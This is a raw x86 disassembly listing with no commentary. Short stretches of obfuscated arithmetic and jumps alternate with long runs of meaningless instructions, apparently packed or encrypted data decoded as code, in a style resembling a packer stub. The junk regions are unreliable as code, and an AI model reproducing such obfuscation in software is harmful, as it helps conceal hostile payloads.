  412221:	mov    eax,DWORD PTR [ebp-0x34]
  412224:	mov    edx,DWORD PTR [ebp-0xb4]
  41222a:	lea    eax,[edx+eax*1-0x76d2]
  412231:	mov    edx,DWORD PTR [ebp-0x44]
  412234:	mov    esi,DWORD PTR [ebp-0x84]
  41223a:	or     eax,edx
  41223c:	xor    edx,edx
  41223e:	div    esi
  412240:	mov    edx,DWORD PTR [ebp-0x54]
  412243:	add    eax,0x43d7
  412248:	xor    eax,0x5e6a
  41224d:	add    eax,DWORD PTR [edx+ecx*1]
  412250:	mov    ecx,DWORD PTR ds:0x42264c
  412256:	add    DWORD PTR [eax],ecx
  412258:	mov    eax,DWORD PTR [ebp-0x90]
  41225e:	mov    ecx,DWORD PTR [ebp-0x8c]
  412264:	mov    edx,DWORD PTR [ebp-0xa0]
  41226a:	mov    esi,DWORD PTR [ebp-0x9c]
  412270:	sub    edx,eax
  412272:	mov    eax,DWORD PTR [ebp-0xb0]
  412278:	sbb    esi,ecx
  41227a:	mov    ecx,DWORD PTR [ebp-0xac]
  412280:	xor    edx,eax
  412282:	mov    eax,DWORD PTR [ebp-0xc0]
  412288:	xor    esi,ecx
  41228a:	mov    ecx,DWORD PTR [ebp-0xbc]
  412290:	jmp    0x412505
  412295:	mov    ah,0x74
  412297:	xchg   edx,eax
  412298:	cli    
  412299:	push   edx
  41229a:	fistp  DWORD PTR [edx+ebx*1]
  41229d:	cs jge 0x4122b6
  4122a0:	stos   BYTE PTR es:[edi],al
  4122a1:	ret    
  4122a2:	xlat   BYTE PTR ds:[ebx]
  4122a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122a4:	mov    esp,0x181860fe
  4122a9:	jno    0x4122bf
  4122ab:	sbb    BYTE PTR [eax],bl
  4122ad:	sbb    ch,ah
  4122af:	cmp    al,0xe1
  4122b1:	(bad)  
  4122b2:	dec    edx
  4122b3:	(bad)  
  4122b4:	repz adc ch,BYTE PTR [ebx]
  4122b7:	add    ch,bh
  4122b9:	repz popf 
  4122bb:	dec    edx
  4122bc:	outs   dx,DWORD PTR ds:[esi]
  4122bd:	fst    st(4)
  4122bf:	mov    al,ds:0x850c684c
  4122c4:	test   al,0x40
  4122c6:	shl    DWORD PTR [ebx+ebp*8+0x2471269a],0xf9
  4122ce:	pusha  
  4122cf:	xor    ecx,edx
  4122d1:	neg    DWORD PTR [ebx-0x58]
  4122d4:	je     0x412283
  4122d6:	imul   edx,edi,0x5d44a2bb
  4122dc:	pop    ecx
  4122dd:	fnstsw WORD PTR [ecx+ecx*8]
  4122e0:	(bad)  
  4122e1:	stos   DWORD PTR es:[edi],eax
  4122e2:	mov    dh,BYTE PTR [eax+0x45]
  4122e5:	inc    ecx
  4122e6:	das    
  4122e7:	or     eax,0xaadc6d4f
  4122ec:	add    esi,DWORD PTR [ecx+0x2b6136f3]
  4122f2:	lea    eax,[eax-0x4c]
  4122f5:	dec    edx
  4122f6:	dec    edx
  4122f7:	hlt    
  4122f8:	lock fiadd WORD PTR [ebp-0x25]
  4122fc:	inc    ecx
  4122fd:	scas   al,BYTE PTR es:[edi]
  4122fe:	ret    0xf14a
  412301:	test   eax,0x5a521a39
  412306:	int    0x44
  412308:	mov    edi,0x397527b1
  41230d:	pop    ebx
  41230e:	push   ss
  41230f:	dec    edx
  412310:	or     eax,0x6458e2f8
  412315:	lods   eax,DWORD PTR ds:[esi]
  412316:	ffree  st(0)
  412318:	jb     0x412381
  41231a:	xchg   edi,eax
  41231b:	daa    
  41231c:	ja     0x41237e
  41231e:	and    DWORD PTR [edx+0x3f2f9243],ecx
  412324:	dec    esi
  412325:	lods   eax,DWORD PTR ds:[esi]
  412326:	shl    DWORD PTR [edx+0x12],1
  412329:	push   edx
  41232a:	push   eax
  41232b:	bound  ebp,QWORD PTR [esi-0x7874d49f]
  412331:	ret    0xb3be
  412334:	popf   
  412335:	xchg   esi,eax
  412336:	cs pop ss
  412338:	stos   BYTE PTR es:[edi],al
  412339:	add    cl,al
  41233b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41233c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41233d:	add    DWORD PTR [edi+0x331ff3ed],esi
  412343:	inc    esp
  412344:	in     al,0xb3
  412346:	cld    
  412347:	std    
  412348:	shl    esp,1
  41234a:	pusha  
  41234b:	pushf  
  41234c:	aam    0x55
  41234e:	adc    al,0xe2
  412350:	lea    ebp,[edi]
  412352:	cmp    ecx,0xf9b2efbf
  412358:	push   esi
  412359:	enter  0x3b5f,0x47
  41235d:	push   es
  41235e:	jbe    0x41238e
  412360:	leave  
  412361:	push   cs
  412362:	out    dx,al
  412363:	mov    DWORD PTR [eax-0x66158cb0],ebx
  412369:	xor    DWORD PTR ds:0x51c94e07,0xef8fed70
  412373:	div    BYTE PTR [ecx+0x60]
  412376:	rol    BYTE PTR [ecx],0x0
  412379:	call   0x262f:0x6f63907f
  412380:	lods   eax,DWORD PTR ds:[esi]
  412381:	sub    eax,0xc7588b68
  412386:	and    al,0x92
  412388:	sub    al,0xf7
  41238a:	push   esi
  41238b:	aad    0x2b
  41238d:	xchg   ecx,eax
  41238e:	push   esp
  41238f:	push   ebp
  412390:	dec    esi
  412391:	dec    esi
  412392:	repnz adc ebp,DWORD PTR ds:0x2e024fa2
  412399:	(bad)  
  41239a:	cmp    DWORD PTR [edi],ebx
  41239c:	aad    0x61
  41239e:	dec    ebp
  41239f:	lods   eax,DWORD PTR ds:[esi]
  4123a0:	xlat   BYTE PTR ds:[ebx]
  4123a1:	lods   al,BYTE PTR ds:[esi]
  4123a2:	xchg   ecx,eax
  4123a3:	add    dh,dl
  4123a5:	push   esp
  4123a6:	and    eax,0xca70081f
  4123ab:	push   ecx
  4123ac:	add    edx,ebp
  4123ae:	pushf  
  4123af:	call   0x87c26d59
  4123b4:	xchg   ch,cl
  4123b6:	sub    edi,DWORD PTR [ebx+ebx*2+0x71b3d6b8]
  4123bd:	and    DWORD PTR [eax+0x6],ecx
  4123c0:	xchg   ah,al
  4123c2:	jae    0x4123e6
  4123c4:	iret   
  4123c5:	mov    bl,0x6b
  4123c7:	mov    ds:0xf6cd9e74,al
  4123cc:	mov    esi,0x4939e267
  4123d1:	data16 adc bh,BYTE PTR [eax+0x3]
  4123d5:	pop    eax
  4123d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123d7:	test   al,0x3c
  4123d9:	xchg   esi,eax
  4123da:	xor    ebp,DWORD PTR [edx+0x1f]
  4123dd:	dec    edi
  4123de:	add    ah,BYTE PTR [edi+edi*4-0x2aa8402f]
  4123e5:	loop   0x412456
  4123e7:	daa    
  4123e8:	ins    BYTE PTR es:[edi],dx
  4123e9:	or     ecx,esi
  4123eb:	retf   0x8e9c
  4123ee:	loop   0x41244a
  4123f0:	adc    al,0x2c
  4123f2:	ror    DWORD PTR [edx+0x215e6237],cl
  4123f8:	cmp    al,0xdc
  4123fa:	jg     0x412420
  4123fc:	loop   0x412415
  4123fe:	inc    esp
  4123ff:	hlt    
  412400:	fstp   DWORD PTR [ecx]
  412402:	nop
  412403:	aaa    
  412404:	sub    ah,dl
  412406:	mov    ebp,0x17daa347
  41240b:	push   edx
  41240c:	dec    esi
  41240d:	stos   BYTE PTR es:[edi],al
  41240e:	sub    ch,BYTE PTR [ebx-0x6b]
  412411:	in     al,dx
  412412:	clc    
  412413:	test   eax,0x3664caea
  412419:	sub    ebx,DWORD PTR [ebp+0x3d]
  41241c:	mov    eax,0x14c7764a
  412421:	ret    0x84bb
  412424:	ja     0x4123e5
  412426:	sbb    edi,DWORD PTR [edi-0x4d]
  412429:	inc    ebp
  41242a:	ret    
  41242b:	dec    ebx
  41242c:	xchg   esp,eax
  41242d:	mov    eax,DWORD PTR [ebx]
  41242f:	and    BYTE PTR [ebx],cl
  412431:	push   edi
  412432:	ds jae 0x412456
  412435:	aas    
  412436:	int    0x47
  412438:	aad    0xef
  41243a:	sub    al,0x29
  41243c:	loope  0x412448
  41243e:	push   cs
  41243f:	mov    ch,0xf8
  412441:	dec    esp
  412442:	sbb    DWORD PTR [ebp-0x32],0xe6123279
  412449:	mov    ch,0xb0
  41244b:	add    al,0x6d
  41244d:	adc    ah,BYTE PTR [edi-0x65]
  412450:	scas   al,BYTE PTR es:[edi]
  412451:	mov    ebp,0x20fa55f5
  412456:	xchg   esi,eax
  412457:	mov    ?,WORD PTR [ebp-0xf]
  41245a:	inc    ebx
  41245b:	jae    0x4124b6
  41245d:	xchg   esi,eax
  41245e:	push   edx
  41245f:	inc    eax
  412460:	test   edi,edx
  412462:	mov    bl,0x2e
  412464:	and    bh,bl
  412466:	add    ecx,ebp
  412468:	call   0x49ee3876
  41246d:	fdivr  DWORD PTR [eax+0x3669ffe0]
  412473:	sub    BYTE PTR [edx],ch
  412475:	scas   eax,DWORD PTR es:[edi]
  412476:	inc    ebx
  412477:	sar    dh,0xda
  41247a:	ficom  WORD PTR [edx-0x4e92c1c9]
  412480:	add    cl,BYTE PTR [eax-0x52]
  412483:	and    ah,al
  412485:	outs   dx,DWORD PTR ds:[esi]
  412486:	scas   eax,DWORD PTR es:[edi]
  412487:	pop    esi
  412488:	mov    edi,0xa0f6059
  41248d:	xor    BYTE PTR [edi-0x19de7908],ch
  412493:	popf   
  412494:	mov    ch,0xa6
  412496:	inc    ecx
  412497:	inc    ebx
  412498:	push   esp
  412499:	retf   0x58b4
  41249c:	js     0x412456
  41249e:	or     eax,0x6dfcd1c4
  4124a3:	inc    edi
  4124a4:	or     eax,0xedc4478a
  4124a9:	mov    edx,0x3065e73e
  4124ae:	mov    ch,BYTE PTR [eax-0x4b71b319]
  4124b4:	or     cl,BYTE PTR [edx-0x4839e77]
  4124ba:	inc    esi
  4124bb:	cmp    BYTE PTR [edi+0x41e7bd96],ch
  4124c1:	push   0x64406f33
  4124c6:	gs cli 
  4124c8:	js     0x41252d
  4124ca:	xchg   ebp,ecx
  4124cc:	lds    esp,FWORD PTR [edi+0x1c3792f5]
  4124d2:	xchg   ecx,eax
  4124d3:	mov    dl,0xd3
  4124d5:	cmp    esi,0xfe176b96
  4124db:	cmp    al,bl
  4124dd:	lods   al,BYTE PTR ds:[esi]
  4124de:	(bad)  
  4124e0:	lds    ebx,FWORD PTR [ecx]
  4124e2:	sahf   
  4124e3:	xchg   esp,eax
  4124e4:	push   ss
  4124e5:	sbb    esp,DWORD PTR ds:0xdfece2ad
  4124eb:	imul   esi,DWORD PTR [eax+0x4caae875],0xffffff90
  4124f2:	dec    esi
  4124f3:	jb     0x412521
  4124f5:	ss mov dh,0xd0
  4124f8:	pop    ds
  4124f9:	xchg   esp,eax
  4124fa:	loopne 0x412506
  4124fc:	inc    ebx
  4124fd:	sbb    al,0xc
  4124ff:	imul   ecx,DWORD PTR [eax],0x2a
  412502:	cmp    DWORD PTR [esi],eax
  412504:	sbb    eax,0xf113d003
  412509:	add    edx,0x2313
  41250f:	adc    esi,0x2a00
  412515:	push   esi
  412516:	push   edx
  412517:	call   0x4220c5
  41251c:	mov    ecx,0x1207
  412521:	sub    ecx,eax
  412523:	push   0x0
  412525:	pop    eax
  412526:	jmp    0x41279b
  41252b:	jae    0x41252c
  41252d:	mov    dl,0xf5
  41252f:	sbb    bl,BYTE PTR [ebx+esi*1-0x74c2fe82]
  412536:	jo     0x412526
  412538:	arpl   WORD PTR [edx],cx
  41253a:	jle    0x412593
  41253c:	pop    esp
  41253d:	sbb    BYTE PTR [eax],bl
  41253f:	jno    0x412555
  412541:	sbb    BYTE PTR [eax],bl
  412543:	es xor al,0xe3
  412546:	stc    
  412547:	fidivr WORD PTR [edx+ebx*2+0x28]
  41254b:	push   0xe
  41254d:	ins    BYTE PTR es:[edi],dx
  41254e:	mov    edx,0x8b588310
  412553:	fstp   TBYTE PTR [eax-0x18]
  412556:	std    
  412557:	in     eax,dx
  412558:	in     al,dx
  412559:	test   eax,0xe2116079
  41255e:	stc    
  41255f:	xchg   ebp,eax
  412560:	popa   
  412561:	mov    WORD PTR [ecx*4+0x7207ce88],gs
  412568:	push   ebp
  412569:	mov    es,WORD PTR [esi+edx*1]
  41256c:	mov    gs,WORD PTR [ebp+0x1a]
  41256f:	mov    ah,0x2f
  412571:	mov    dl,0x9b
  412573:	pop    ebp
  412574:	push   esi
  412575:	out    dx,eax
  412576:	push   ss
  412577:	add    eax,0x294c34bf
  41257c:	dec    esi
  41257d:	xor    BYTE PTR [eax],bh
  41257f:	dec    edi
  412580:	sub    esp,edx
  412582:	jns    0x4125a6
  412584:	pop    ebx
  412585:	fist   DWORD PTR [esi]
  412587:	bnd fs ja 0x4125e2
  41258b:	dec    ebp
  41258c:	mov    ds:0x17af5ab8,eax
  412591:	sub    ch,BYTE PTR [edx]
  412593:	mov    ebx,0xecef7263
  412598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412599:	enter  0xe30,0x7
  41259d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41259e:	stos   BYTE PTR es:[edi],al
  41259f:	gs pop ebx
  4125a1:	cdq    
  4125a2:	ins    DWORD PTR es:[edi],dx
  4125a3:	aam    0x88
  4125a5:	sbb    al,0x12
  4125a7:	xor    BYTE PTR [edx+0x23],ah
  4125aa:	xor    esp,DWORD PTR [edi]
  4125ac:	frstor [edx]
  4125ae:	dec    ebx
  4125af:	add    DWORD PTR [esi],edx
  4125b1:	ins    BYTE PTR es:[edi],dx
  4125b2:	mov    eax,0x2ccfbfe9
  4125b7:	jb     0x412589
  4125b9:	hlt    
  4125ba:	test   eax,0x43dcd752
  4125bf:	mov    eax,ds:0xa407c324
  4125c4:	mov    dh,0x53
  4125c6:	sub    DWORD PTR [esi],ebp
  4125c8:	outs   dx,DWORD PTR ds:[esi]
  4125c9:	dec    eax
  4125ca:	in     al,0x87
  4125cc:	shr    dl,1
  4125ce:	ins    BYTE PTR es:[edi],dx
  4125cf:	repz inc ecx
  4125d1:	mov    ebp,0x5d1393bd
  4125d6:	sbb    DWORD PTR [eax+0x1a],0xb8fa9a9e
  4125dd:	jae    0x412613
  4125df:	shl    esi,0x82
  4125e2:	in     eax,0x9f
  4125e4:	mov    esi,0xd4185e97
  4125e9:	push   ebx
  4125ea:	mov    ds:0x7b59588c,al
  4125ef:	ret    
  4125f0:	ret    0x7c16
  4125f3:	ss pop ss
  4125f5:	das    
  4125f6:	pop    ebp
  4125f7:	out    0xca,eax
  4125f9:	call   0xd655:0x2263c0de
  412600:	fild   DWORD PTR [ecx]
  412602:	in     al,dx
  412603:	inc    edx
  412604:	jb     0x4125f5
  412606:	sahf   
  412607:	dec    BYTE PTR [ecx+eiz*4-0x6c]
  41260b:	aam    0xc2
  41260d:	mov    edi,0xcc03562e
  412612:	js     0x4125ba
  412614:	xchg   ebp,eax
  412615:	call   0xd15839d0
  41261a:	and    bl,ah
  41261c:	cld    
  41261d:	call   0x4318d6e1
  412622:	pop    esp
  412623:	(bad)  
  412624:	fsubr  DWORD PTR [esi+eax*8]
  412627:	ror    BYTE PTR [ebp+edx*1-0xe05f42a],cl
  41262e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41262f:	pop    ss
  412630:	cld    
  412631:	out    dx,al
  412632:	jmp    0x4125e2
  412634:	nop
  412635:	out    0xae,eax
  412637:	xor    eax,DWORD PTR [esi+eax*1-0x14277637]
  41263e:	scas   eax,DWORD PTR es:[edi]
  41263f:	jp     0x41269f
  412641:	pop    ds
  412642:	push   0xffffff9c
  412644:	jnp    0x412650
  412646:	retf   
  412647:	and    BYTE PTR [esi-0x1e7be01f],cl
  41264d:	xor    edx,ebp
  41264f:	jl     0x4126ca
  412651:	pop    ebx
  412652:	jecxz  0x412669
  412654:	scas   al,BYTE PTR es:[edi]
  412655:	adc    BYTE PTR [esi+edx*4-0x5b304712],al
  41265c:	lods   al,BYTE PTR ds:[esi]
  41265d:	add    esp,ebx
  41265f:	mov    WORD PTR [edx],ds
  412661:	mov    ch,0x1
  412663:	popf   
  412664:	ds push 0x23
  412667:	bound  ebp,QWORD PTR [ebx]
  412669:	add    al,0x6c
  41266b:	nop
  41266c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41266d:	(bad)  
  41266e:	cmp    esi,DWORD PTR [ebp+0x1b4ffcef]
  412674:	jmp    0x4056:0x15a284ee
  41267b:	push   ebp
  41267c:	or     ecx,DWORD PTR [ebp-0x429f7c5b]
  412682:	cli    
  412683:	pop    ebp
  412684:	clc    
  412685:	loope  0x412694
  412687:	test   BYTE PTR ds:0x47aba9e3,0x8
  41268e:	mov    ch,0x29
  412690:	outs   dx,DWORD PTR ds:[esi]
  412691:	popf   
  412692:	scas   eax,DWORD PTR es:[edi]
  412693:	out    dx,eax
  412694:	xor    al,0xa6
  412696:	xor    ecx,ecx
  412698:	sub    edi,esi
  41269a:	push   cs
  41269b:	lea    edi,[edx-0x2d]
  41269e:	fucom  st(4)
  4126a0:	jae    0x41270e
  4126a2:	xchg   ecx,eax
  4126a3:	mov    bl,0x36
  4126a5:	xchg   ecx,eax
  4126a6:	call   0x2391:0x5649d469
  4126ad:	fwait
  4126ae:	xor    BYTE PTR [ebx],ah
  4126b0:	push   esp
  4126b1:	push   ebp
  4126b2:	sub    eax,0x466cfbdd
  4126b7:	mov    DWORD PTR fs:[ecx],esi
  4126ba:	xchg   BYTE PTR [ecx-0x2198125e],al
  4126c0:	mov    esp,0x4ece08bf
  4126c5:	inc    esp
  4126c6:	push   esp
  4126c7:	repnz test DWORD PTR [ecx-0x13665fc3],0xc61b7c34
  4126d2:	retf   
  4126d3:	adc    edi,esp
  4126d5:	adc    dh,BYTE PTR [ebx+0x11c2de7f]
  4126db:	aas    
  4126dc:	je     0x412666
  4126de:	jg     0x4126a3
  4126e0:	mov    ebx,DWORD PTR [edi+0x78]
  4126e3:	adc    dl,dh
  4126e5:	pop    esi
  4126e6:	(bad)  
  4126e7:	push   ds
  4126e8:	sti    
  4126e9:	in     eax,dx
  4126ea:	jb     0x412753
  4126ec:	pop    es
  4126ed:	out    0xd,al
  4126ef:	out    0x7b,eax
  4126f1:	je     0x412730
  4126f3:	pop    edi
  4126f4:	aad    0x77
  4126f6:	add    edx,edx
  4126f8:	or     esp,DWORD PTR [edi+0x119f4015]
  4126fe:	mov    esi,0x217c5b9c
  412703:	jmp    0x4126cc
  412705:	and    eax,0x1b0ef73c
  41270a:	lock mov ch,0x4b
  41270d:	sbb    bh,BYTE PTR [eax]
  41270f:	les    esp,FWORD PTR [ebx]
  412711:	lock cmp DWORD PTR [ecx-0x34aa7d80],ecx
  412718:	loope  0x412762
  41271a:	rcl    DWORD PTR [edi-0x2f],0x32
  41271e:	fucomp st(7)
  412720:	ficomp DWORD PTR [esp+ecx*8]
  412723:	loope  0x4126a9
  412725:	dec    esi
  412726:	dec    edi
  412727:	sub    al,0x4b
  412729:	inc    edx
  41272a:	push   ebp
  41272b:	cmp    bh,bl
  41272d:	inc    ebp
  41272e:	sbb    BYTE PTR [ebp+eiz*4-0x407dc3f4],dl
  412735:	stos   BYTE PTR es:[edi],al
  412736:	outs   dx,DWORD PTR ds:[esi]
  412737:	jns    0x41271e
  412739:	or     al,0x8c
  41273b:	retf   0x1726
  41273e:	gs mov cl,0x1a
  412741:	test   al,0x33
  412743:	mov    eax,0xbb3008c6
  412748:	ss ds dec eax
  41274b:	jmp    DWORD PTR [ecx]
  41274d:	push   esp
  41274e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  412750:	cs stc 
  412752:	fidivr WORD PTR [edx-0x51]
  412755:	dec    ebx
  412756:	pop    ss
  412757:	or     dl,cl
  412759:	das    
  41275a:	test   DWORD PTR [eax-0x498f6889],esi
  412760:	xor    eax,eax
  412762:	mov    eax,ds:0x2d33de9
  412767:	daa    
  412768:	jmp    0x5cbfe2ee
  41276d:	jns    0x41278a
  41276f:	bound  esp,QWORD PTR [ebp-0x2f]
  412772:	popa   
  412773:	mov    WORD PTR [eax-0x68],es
  412776:	imul   DWORD PTR [eax]
  412778:	inc    edi
  412779:	fs mov ebx,0xfaa60fa8
  41277f:	retf   
  412780:	imul   ebp,DWORD PTR [edi],0xf741563e
  412786:	out    dx,al
  412787:	and    ah,BYTE PTR [ebx+0xa]
  41278a:	dec    ecx
  41278b:	sub    DWORD PTR [esi-0xd378612],edx
  412791:	loopne 0x4127b5
  412793:	and    dl,BYTE PTR [ecx-0xe]
  412796:	dec    esp
  412797:	lods   eax,DWORD PTR ds:[esi]
  412798:	sub    BYTE PTR [eax-0x743de439],bh
  41279e:	adc    eax,0x42264c
  4127a3:	xor    esi,esi
  4127a5:	cmp    edx,ecx
  4127a7:	jne    0x4127da
  4127ad:	cmp    esi,eax
  4127af:	jne    0x4127da
  4127b5:	mov    eax,DWORD PTR [ebp-0x4]
  4127b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4127bb:	add    eax,0x4296
  4127c0:	shr    eax,0x2
  4127c3:	or     eax,ecx
  4127c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4127c8:	xor    eax,ecx
  4127ca:	xor    eax,0x4e94
  4127cf:	add    eax,DWORD PTR ds:0x42264c
  4127d5:	mov    ds:0x422654,eax
  4127da:	pop    esi
  4127db:	leave  
  4127dc:	ret    0x4
  4127df:	push   ebp
  4127e0:	mov    ebp,esp
  4127e2:	sub    esp,0x58
  4127e5:	push   ebx
  4127e6:	push   esi
  4127e7:	push   edi
  4127e8:	mov    DWORD PTR [ebp-0x58],0x3082
  4127ef:	mov    DWORD PTR [ebp-0x54],0x37a2
  4127f6:	mov    DWORD PTR [ebp-0x50],0x49d6
  4127fd:	mov    DWORD PTR [ebp-0x4c],0x6390
  412804:	mov    DWORD PTR [ebp-0x48],0x40f2
  41280b:	mov    DWORD PTR [ebp-0x44],0x21d4
  412812:	mov    DWORD PTR [ebp-0x28],0x4726
  412819:	mov    DWORD PTR [ebp-0x24],0x221a
  412820:	mov    DWORD PTR [ebp-0x30],0x768c
  412827:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41282e:	mov    DWORD PTR [ebp-0x40],0x6cf6
  412835:	mov    DWORD PTR [ebp-0x3c],0x94c
  41283c:	mov    DWORD PTR [ebp-0x38],0x4797
  412843:	mov    DWORD PTR [ebp-0x34],0x4439
  41284a:	mov    DWORD PTR [ebp-0x20],0x2531
  412851:	mov    esi,0x5a3e
  412856:	mov    DWORD PTR [ebp-0x1c],esi
  412859:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  412860:	mov    DWORD PTR [ebp-0x14],0x7
  412867:	mov    DWORD PTR [ebp-0x10],0xe3a
  41286e:	mov    DWORD PTR [ebp-0xc],0x6a6e
  412875:	mov    DWORD PTR [ebp-0x8],0x6b99
  41287c:	mov    DWORD PTR [ebp-0x4],0x2acd
  412883:	mov    eax,DWORD PTR [ebp-0x10]
  412886:	mov    ecx,DWORD PTR [ebp-0xc]
  412889:	mov    eax,DWORD PTR [ebp-0x8]
  41288c:	mov    ecx,DWORD PTR [ebp-0x4]
  41288f:	mov    eax,DWORD PTR [ebp-0x18]
  412892:	mov    ecx,DWORD PTR [ebp-0x14]
  412895:	jmp    0x412c6d
  41289a:	icebp  
  41289b:	not    esi
  41289d:	xchg   ecx,eax
  41289e:	into   
  41289f:	xor    DWORD PTR [esi],ebp
  4128a1:	jbe    0x4128b2
  4128a3:	cmc    
  4128a4:	gs mov esp,0xbcd54f15
  4128aa:	scas   al,BYTE PTR es:[edi]
  4128ab:	pop    eax
  4128ac:	sbb    BYTE PTR [eax],bl
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	adc    bl,BYTE PTR [eax]
  4128b1:	sbb    al,dl
  4128b3:	or     bl,bh
  4128b5:	loope  0x4128c1
  4128b7:	and    BYTE PTR [ebx],0x1b
  4128ba:	in     al,0x1c
  4128bc:	int    0x69
  4128be:	sub    BYTE PTR [ebx-0x65b1138d],dl
  4128c4:	jbe    0x4128a1
  4128c6:	mov    dh,0x15
  4128c8:	cmp    bl,BYTE PTR [edi-0x50]
  4128cb:	arpl   si,di
  4128cd:	mov    esp,0xa6da6f05
  4128d2:	les    esp,FWORD PTR [eax]
  4128d4:	and    edx,edi
  4128d6:	mov    eax,ds:0x5c024223
  4128db:	into   
  4128dc:	inc    edx
  4128dd:	cld    
  4128de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128df:	mov    edx,0x3ebc4d86
  4128e4:	test   DWORD PTR [edx+0x55c9487],ebp
  4128ea:	hlt    
  4128eb:	popa   
  4128ec:	scas   eax,DWORD PTR es:[edi]
  4128ed:	push   ss
  4128ee:	jecxz  0x4128e7
  4128f0:	cmp    ebx,DWORD PTR [ebx]
  4128f2:	push   ebp
  4128f3:	loop   0x41291d
  4128f5:	lahf   
  4128f6:	(bad)  
  4128f7:	pop    edx
  4128f8:	push   ebx
  4128f9:	not    dh
  4128fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128fc:	jl     0x412885
  4128fe:	(bad)  
  4128ff:	jno    0x41290c
  412901:	retf   
  412902:	adc    al,0x61
  412904:	rol    ebx,cl
  412906:	mov    esi,0x9955e9b
  41290b:	cld    
  41290c:	bound  ebp,QWORD PTR [esi+ebp*2]
  41290f:	adc    eax,0x7cd6fad4
  412914:	mov    edi,0x8223b1e0
  412919:	inc    ax
  41291b:	push   ebx
  41291c:	jl     0x4128e9
  41291e:	cmp    edx,0xa26a62cf
  412924:	and    BYTE PTR [ecx-0x24210f95],dl
  41292a:	lahf   
  41292b:	sbb    DWORD PTR [ecx],esp
  41292d:	mov    edx,0xfc972c35
  412932:	es jle 0x412917
  412935:	mov    edx,?
  412937:	mov    ah,0xfa
  412939:	je     0x41298f
  41293b:	cld    
  41293c:	fbstp  TBYTE PTR [esi]
  41293e:	xchg   DWORD PTR [eax-0x6c9e6811],eax
  412944:	mov    ebp,0x67a9cb7
  412949:	aam    0x89
  41294b:	xor    bl,BYTE PTR [ebx]
  41294d:	mov    eax,0xc7775d0f
  412952:	xlat   BYTE PTR ds:[ebx]
  412953:	mov    al,BYTE PTR [edx-0x6a]
  412956:	mov    eax,ds:0x72b3f9
  41295b:	add    bl,BYTE PTR ss:[ebp+0x44555372]
  412962:	jmp    0x4128f4
  412964:	push   ax
  412966:	imul   eax,DWORD PTR [edx+eax*8+0xd],0xc4f74479
  41296e:	mov    edx,0x3c088224
  412973:	and    DWORD PTR [ebp+eax*1+0x215cce31],0x1f
  41297b:	add    DWORD PTR [esi+ebx*4-0x1f],ebx
  41297f:	mov    ah,0x16
  412982:	lds    ebp,FWORD PTR [edi+0x53]
  412985:	cmp    DWORD PTR [ebx],esp
  412987:	pop    esp
  412988:	or     al,0xba
  41298a:	scas   al,BYTE PTR es:[edi]
  41298b:	popa   
  41298c:	dec    edx
  41298d:	std    
  41298e:	(bad)  
  412990:	stos   BYTE PTR es:[edi],al
  412991:	add    BYTE PTR [ecx],dh
  412993:	add    eax,DWORD PTR [ebx-0x2]
  412996:	mov    eax,0x5b72a0b6
  41299b:	shr    DWORD PTR [edi+0x3f],0xce
  41299f:	inc    ecx
  4129a0:	mov    gs,WORD PTR [ebp-0x58]
  4129a3:	sub    DWORD PTR [esi-0x56],ecx
  4129a6:	loop   0x4129dd
  4129a8:	mov    dl,0xc9
  4129aa:	jae    0x412a16
  4129ac:	enter  0x3295,0xcb
  4129b0:	out    dx,al
  4129b1:	cwde   
  4129b2:	shr    DWORD PTR [ebp+0x15933d06],1
  4129b8:	mov    DWORD PTR [eax-0x21],esp
  4129bb:	sub    edi,ecx
  4129bd:	inc    ebp
  4129be:	bound  edx,QWORD PTR [eax+0x28]
  4129c1:	popf   
  4129c2:	ror    DWORD PTR [esi+ecx*1],cl
  4129c5:	xor    cl,ah
  4129c7:	sub    eax,0x78b89e9a
  4129cc:	inc    ecx
  4129cd:	adc    ebx,DWORD PTR [eax+edi*1-0x3e9c5099]
  4129d4:	sbb    ch,BYTE PTR [edi-0x67]
  4129d7:	pusha  
  4129d8:	cmp    edi,DWORD PTR [ebp+0x7b2ed98f]
  4129de:	sahf   
  4129df:	pop    ebp
  4129e0:	mov    DWORD PTR ds:0x275fd3e,ebp
  4129e6:	add    eax,0x149e1082
  4129eb:	leave  
  4129ec:	dec    ebp
  4129ed:	add    ch,BYTE PTR [ecx]
  4129ef:	retf   
  4129f0:	rcl    DWORD PTR [edx-0x33],0x39
  4129f4:	sti    
  4129f5:	test   eax,0x4ce49103
  4129fa:	sub    al,cl
  4129fc:	sub    al,0x99
  4129fe:	inc    esp
  4129ff:	xor    al,0x81
  412a01:	xchg   DWORD PTR [ecx-0x4b],eax
  412a04:	sti    
  412a05:	cdq    
  412a06:	dec    edi
  412a07:	enter  0x2d28,0xfa
  412a0b:	xchg   DWORD PTR ds:0x4ddab6c7,esp
  412a11:	add    DWORD PTR [edx+0x1a4a2c8c],eax
  412a17:	dec    ebp
  412a18:	xor    DWORD PTR [eax+0x16],edx
  412a1b:	pop    ss
  412a1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a1d:	sbb    dl,al
  412a1f:	mov    ds:0xa1d7bd48,eax
  412a24:	mov    al,ds:0x9a9c2fbb
  412a29:	jmp    0x412aa3
  412a2b:	xor    DWORD PTR [edx],esp
  412a2d:	test   DWORD PTR [eax-0x32],ebp
  412a30:	dec    ebp
  412a31:	lock sahf 
  412a33:	and    al,0x55
  412a35:	popa   
  412a36:	mov    edi,0x50b5f58b
  412a3b:	imul   edx,DWORD PTR [esi],0xffffffe4
  412a3e:	imul   eax,esi,0x2430d1a5
  412a44:	in     eax,0x6c
  412a46:	inc    edx
  412a47:	cmp    eax,DWORD PTR [edx]
  412a49:	jnp    0x412a49
  412a4b:	lahf   
